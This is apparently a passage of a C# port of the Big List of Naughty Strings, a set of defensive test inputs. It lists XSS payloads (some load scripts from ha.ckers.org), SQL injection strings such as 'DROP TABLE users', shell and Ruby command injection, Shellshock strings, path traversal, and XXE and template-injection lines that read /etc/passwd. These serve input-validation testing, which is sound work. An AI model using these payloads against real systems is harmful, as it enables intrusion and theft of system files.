            "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "`\"\'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x22onerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x0Donerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x09onerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x0Conerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x00onerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x27onerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x20onerror=javascript:alert(1)>",
            "\"`\'><script>\\x3Bjavascript:alert(1)</script>",
            "\"`\'><script>\\x0Djavascript:alert(1)</script>",
            "\"`\'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x81javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x84javascript:alert(1)</script>",
            "\"`\'><script>\\xE3\\x80\\x80javascript:alert(1)</script>",
            "\"`\'><script>\\x09javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x89javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x85javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x88javascript:alert(1)</script>",
            "\"`\'><script>\\x00javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>",
            "\"`\'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>",
            "\"`\'><script>\\x0Cjavascript:alert(1)</script>",
            "\"`\'><script>\\x2Bjavascript:alert(1)</script>",
            "\"`\'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>",
            "\"`\'><script>-javascript:alert(1)</script>",
            "\"`\'><script>\\x0Ajavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>",
            "\"`\'><script>\\x7Ejavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x87javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>",
            "\"`\'><script>\\xC2\\x85javascript:alert(1)</script>",
            "\"`\'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x83javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>",
            "\"`\'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x80javascript:alert(1)</script>",
            "\"`\'><script>\\x21javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x82javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x86javascript:alert(1)</script>",
            "\"`\'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>",
            "\"`\'><script>\\x0Bjavascript:alert(1)</script>",
            "\"`\'><script>\\x20javascript:alert(1)</script>",
            "\"`\'><script>\\xC2\\xA0javascript:alert(1)</script>",
            "<img \\x00src=x onerror=\"alert(1)\">",
            "<img \\x47src=x onerror=\"javascript:alert(1)\">",
            "<img \\x11src=x onerror=\"javascript:alert(1)\">",
            "<img \\x12src=x onerror=\"javascript:alert(1)\">",
            "<img\\x47src=x onerror=\"javascript:alert(1)\">",
            "<img\\x10src=x onerror=\"javascript:alert(1)\">",
            "<img\\x13src=x onerror=\"javascript:alert(1)\">",
            "<img\\x32src=x onerror=\"javascript:alert(1)\">",
            "<img\\x47src=x onerror=\"javascript:alert(1)\">",
            "<img\\x11src=x onerror=\"javascript:alert(1)\">",
            "<img \\x47src=x onerror=\"javascript:alert(1)\">",
            "<img \\x34src=x onerror=\"javascript:alert(1)\">",
            "<img \\x39src=x onerror=\"javascript:alert(1)\">",
            "<img \\x00src=x onerror=\"javascript:alert(1)\">",
            "<img src\\x09=x onerror=\"javascript:alert(1)\">",
            "<img src\\x10=x onerror=\"javascript:alert(1)\">",
            "<img src\\x13=x onerror=\"javascript:alert(1)\">",
            "<img src\\x32=x onerror=\"javascript:alert(1)\">",
            "<img src\\x12=x onerror=\"javascript:alert(1)\">",
            "<img src\\x11=x onerror=\"javascript:alert(1)\">",
            "<img src\\x00=x onerror=\"javascript:alert(1)\">",
            "<img src\\x47=x onerror=\"javascript:alert(1)\">",
            "<img src=x\\x09onerror=\"javascript:alert(1)\">",
            "<img src=x\\x10onerror=\"javascript:alert(1)\">",
            "<img src=x\\x11onerror=\"javascript:alert(1)\">",
            "<img src=x\\x12onerror=\"javascript:alert(1)\">",
            "<img src=x\\x13onerror=\"javascript:alert(1)\">",
            "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">",
            "<img src=x onerror=\\x09\"javascript:alert(1)\">",
            "<img src=x onerror=\\x10\"javascript:alert(1)\">",
            "<img src=x onerror=\\x11\"javascript:alert(1)\">",
            "<img src=x onerror=\\x12\"javascript:alert(1)\">",
            "<img src=x onerror=\\x32\"javascript:alert(1)\">",
            "<img src=x onerror=\\x00\"javascript:alert(1)\">",
            "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>",
            "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>",
            "<img src onerror /\" \'\"= alt=javascript:alert(1)//\">",
            "<title onpropertychange=javascript:alert(1)></title><title title=>",
            "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:aler" +
    "t(1)></a>\">",
            "<!--[if]><script>javascript:alert(1)</script -->",
            "<!--[if<img src=x onerror=javascript:alert(1)//]> -->",
            "<script src=\"/\\%(jscript)s\"></script>",
            "<script src=\"\\\\%(jscript)s\"></script>",
            "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<IMG SRC=# onmouseover=\"alert(\'xxs\')\">",
            "<IMG SRC= onmouseover=\"alert(\'xxs\')\">",
            "<IMG onmouseover=\"alert(\'xxs\')\">",
            "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108" +
    ";&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
            "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105" +
    "&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#000004" +
    "0&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
            "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#" +
    "x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
            "<IMG SRC=\"jav   ascript:alert(\'XSS\');\">",
            "<IMG SRC=\"jav&#x09;ascript:alert(\'XSS\');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert(\'XSS\');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert(\'XSS\');\">",
            "perl -e \'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";\' > out",
            "<IMG SRC=\" &#14;  javascript:alert(\'XSS\');\">",
            "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
            "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
            "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
            "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
            "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >",
            "<SCRIPT SRC=//ha.ckers.org/.j>",
            "<IMG SRC=\"javascript:alert(\'XSS\')\"",
            "<iframe src=http://ha.ckers.org/scriptlet.html <",
            "\\\";alert(\'XSS\');//",
            "<u oncopy=alert()> Copy me</u>",
            "<i onwheel=alert(1)> Scroll over me </i>",
            "<plaintext>",
            "http://a/%%30%30",
            "</textarea><script>alert(123)</script>",
        };

        /// <summary>
        ///  Strings which can cause a SQL injection if inputs are not sanitized.
        /// </summary>
        public static IReadOnlyList<string> SQLInjection = new List<string>
        {
            "1;DROP TABLE users",
            "1\'; DROP TABLE users-- 1",
            "\' OR 1=1 -- 1",
            "\' OR \'1\'=\'1",
            "\'; EXEC sp_MSForEachTable \'DROP TABLE ?\'; --",
            " ",
            "%",
            "_",
        };

        /// <summary>
        ///  Strings which can cause user to run code on server as a privileged user (c.f. https://news.ycombinator.com/item?id=7665153).
        /// </summary>
        public static IReadOnlyList<string> ServerCodeInjection = new List<string>
        {
            "-",
            "--",
            "--version",
            "--help",
            "$USER",
            "/dev/null; touch /tmp/blns.fail ; echo",
            "`touch /tmp/blns.fail`",
            "$(touch /tmp/blns.fail)",
            "@{[system \"touch /tmp/blns.fail\"]}",
        };

        /// <summary>
        ///  Strings which can call system commands within Ruby/Rails applications.
        /// </summary>
        public static IReadOnlyList<string> CommandInjectionRuby = new List<string>
        {
            "eval(\"puts \'hello world\'\")",
            "System(\"ls -al /\")",
            "`ls -al /`",
            "Kernel.exec(\"ls -al /\")",
            "Kernel.exit(1)",
            "%x(\'ls -al /\')",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!E" +
    "NTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        };

        /// <summary>
        ///  Strings which can be accidentally expanded into different strings if evaluated in the wrong context, e.g. used as a printf format string or via Perl or shell eval. Might expose sensitive data from the program doing the interpolation, or might just represent the wrong string.
        /// </summary>
        public static IReadOnlyList<string> UnwantedInterpolation = new List<string>
        {
            "$HOME",
            "$ENV{\'HOME\'}",
            "%d",
            "%s%s%s%s%s",
            "{0}",
            "%*.*s",
            "%@",
            "%n",
            "File:///",
        };

        /// <summary>
        ///  Strings which can cause user to pull in files that should not be a part of a web server.
        /// </summary>
        public static IReadOnlyList<string> FileInclusion = new List<string>
        {
            "../../../../../../../../../../../etc/passwd%00",
            "../../../../../../../../../../../etc/hosts",
        };

        /// <summary>
        ///  Strings that test for known vulnerabilities.
        /// </summary>
        public static IReadOnlyList<string> KnownCVEsandVulnerabilities = new List<string>
        {
            "() { 0; }; touch /tmp/blns.shellshock1.fail;",
            "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }",
            "<<< %s(un=\'%s\') = %u",
            "+++ATH0",
        };

        /// <summary>
        ///  Strings which are reserved characters in MSDOS/Windows.
        /// </summary>
        public static IReadOnlyList<string> MSDOSWindowsSpecialFilenames = new List<string>
        {
            "CON",
            "PRN",
            "AUX",
            "CLOCK$",
            "NUL",
            "A:",
            "ZZ:",
            "COM1",
            "LPT1",
            "LPT2",
            "LPT3",
            "COM2",
            "COM3",
            "COM4",
            "DCC SEND STARTKEYLOGGER 0 0 0",
        };

        /// <summary>
        ///  Innocuous strings which may be blocked by profanity filters (https://en.wikipedia.org/wiki/Scunthorpe_problem).
        /// </summary>
        public static IReadOnlyList<string> ScunthorpeProblem = new List<string>
        {
            "Scunthorpe General Hospital",
            "Penistone Community Church",
            "Lightwater Country Park",
            "Jimmy Clitheroe",
            "Horniman Museum",
            "shitake mushrooms",
            "RomansInSussex.co.uk",
            "http://www.cum.qc.ca/",
            "Craig Cockburn, Software Specialist",
            "Linda Callahan",
            "Dr. Herman I. Libshitz",
            "magna cum laude",
            "Super Bowl XXX",
            "medieval erection of parapets",
            "evaluate",
            "mocha",
            "expression",
            "Arsenal canal",
            "classic",
            "Tyson Gay",
            "Dick Van Dyke",
            "basement",
        };

        /// <summary>
        ///  Strings which may cause human to reinterpret worldview.
        /// </summary>
        public static IReadOnlyList<string> Humaninjection = new List<string>
        {
            "If you\'re reading this, you\'ve been in a coma for almost 20 years now. We\'re tryi" +
    "ng a new technique. We don\'t know where this message will end up in your dream, " +
    "but we hope it works. Please wake up, we miss you.",
        };

        /// <summary>
        ///  Strings which punish the fools who use cat/type on this file.
        /// </summary>
        public static IReadOnlyList<string> Terminalescapecodes = new List<string>
        {
            "Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue",
            "But now...[20Cfor my greatest trick...[8m",
            "The quick brown fox... [Beeeep]",
        };

        /// <summary>
        ///  Strings which crashed iMessage in various versions of iOS.
        /// </summary>
        public static IReadOnlyList<string> iOSVulnerabilities = new List<string>
        {
            "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗",
            "🏳0🌈️",
            "జ్ఞ‌ా",
            "گچپژ",
            "{% print \'x\' * 64 * 1024**3 %}",
            "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}",
        };

    }
}
